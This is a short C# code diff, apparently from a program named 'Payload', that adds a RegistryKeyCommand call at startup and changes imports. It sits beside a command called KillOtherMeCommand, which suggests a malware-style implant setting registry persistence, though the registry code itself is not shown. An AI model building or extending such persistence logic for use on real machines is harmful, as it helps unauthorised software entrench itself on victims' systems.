@@ -1,5 +1,4 @@
-﻿using Microsoft.Win32;
-using Payload.Common;
+﻿using Payload.Common;
 using Payload.Core.Command;
 using System;
 using System.Collections.Generic;
@@ -10,6 +9,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Security.Principal;
+using System.Security.AccessControl;
 
 namespace Payload
 {
@@ -18,6 +18,8 @@ namespace Payload
         static void Main(string[] args)
         {
             AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
+
+            new RegistryKeyCommand().Execute();
 
             new KillOtherMeCommand().Execute();
 
